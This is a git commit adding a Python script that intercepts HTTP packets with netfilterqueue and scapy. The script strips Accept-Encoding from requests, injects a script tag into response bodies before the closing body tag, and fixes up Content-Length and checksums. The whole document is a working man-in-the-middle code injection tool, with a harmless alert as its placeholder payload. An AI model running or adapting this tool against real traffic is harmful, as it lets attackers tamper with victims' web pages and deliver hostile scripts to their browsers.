bd59698096e5f759f5789f97b4715f151674e2ff
root <root@localhost.localdomain>
2019-07-27 10:20:46 -0400

    create CodeInjector and finish the Content-Length recalculation

---
+++ CodeInjector/code_injector.py
@@ -0,0 +1,43 @@
+# netfilterqueue has some issues with pyhton3, so using python2 to run this script
+import netfilterqueue
+import scapy.all as scapy
+import re
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())#convert packet to scapy packet
+    if scapy_packet.haslayer(scapy.Raw):#Raw layer contain the http data
+        load = scapy_packet[scapy.Raw].load
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("[+] Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+] Response")
+            #print(scapy_packet.show())
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)#Content-Length will limit the code injection 
+            if content_length_search:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:#if load changed, than update the load
+            new_packet = set_load(scapy_packet, load)#work for scapy_packet
+            packet.set_payload(str(new_packet))#scapy_packet to normal packet
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
